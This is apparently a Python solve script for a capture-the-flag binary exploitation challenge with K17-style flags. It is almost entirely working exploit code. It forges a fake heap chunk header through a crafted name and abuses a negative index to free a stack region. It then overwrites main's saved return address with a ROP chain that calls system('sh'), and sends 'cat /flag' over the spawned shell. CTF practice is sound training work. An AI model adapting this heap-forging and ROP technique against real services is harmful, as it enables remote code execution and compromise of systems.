#!/usr/bin/env python3
import json
import re
import socket
import struct
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parent
FLAG_RE = re.compile(rb"K17\{[^}\r\n]*\}")


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def load_endpoint(name: str) -> dict:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    return next(endpoint for endpoint in data["endpoints"] if endpoint["name"] == name)


def recv_until(connection: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = connection.recv(4096)
        if not chunk:
            raise ConnectionError(f"connection closed before marker {marker!r}")
        data.extend(chunk)
    return bytes(data)


def recv_all(connection: socket.socket) -> bytes:
    data = bytearray()
    while True:
        chunk = connection.recv(4096)
        if not chunk:
            return bytes(data)
        data.extend(chunk)


def exploit() -> bytes:
    endpoint = load_endpoint("main")

    # rbp is 16-byte aligned, so the second name begins at an aligned
    # rbp-0x20. split() replaces the byte at offset 15 with NUL, completing
    # the forged 0xa1 chunk header at rbp-0x30.
    name = b"\0" * 8 + p64(0xA1)[:7] + b" " + b"B" * 13 + b"\n"
    if len(name) != 30:
        raise AssertionError("the initial read must receive exactly 30 bytes")

    # malloc(0x90) returns rbp-0x20 after free(wishes[-2]). The following
    # fgets then reaches main's saved return address at payload offset 0x28.
    payload = b"A" * 24
    payload += p64(0x402013)  # Empty string used by the final printf.
    payload += p64(0)
    payload += p64(0x4012E2)  # pop rdi; pop rbp; ret, hidden in an immediate.
    payload += p64(0x402011)  # "sh\0" inside the menu string "Wish\0".
    payload += p64(0)
    payload += p64(0x401130)  # system@plt
    payload += p64(0x4011E0)  # exit@plt after the shell exits.

    with socket.create_connection((endpoint["host"], endpoint["port"]), timeout=10) as connection:
        connection.settimeout(10)

        recv_until(connection, b">> ")
        connection.sendall(name)

        recv_until(connection, b">> ")
        connection.sendall(b"2\n")
        recv_until(connection, b">> ")
        connection.sendall(b"-2\n")

        recv_until(connection, b">> ")
        connection.sendall(b"1\n")
        recv_until(connection, b">> ")
        connection.sendall(b"0\n")
        recv_until(connection, b">> ")
        connection.sendall(payload + b"\n")

        recv_until(connection, b">> ")
        connection.sendall(b"3\n")
        recv_until(connection, b"\x1b[0m\n")

        connection.sendall(b"cat /flag\nexit\n")
        output = recv_all(connection)

    match = FLAG_RE.search(output)
    if match is None:
        raise RuntimeError("exploit completed without a flag in the response")
    return match.group(0)


def main() -> int:
    try:
        flag = exploit()
    except Exception as error:
        print(f"solve failed: {error}", file=sys.stderr)
        return 1
    sys.stdout.buffer.write(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
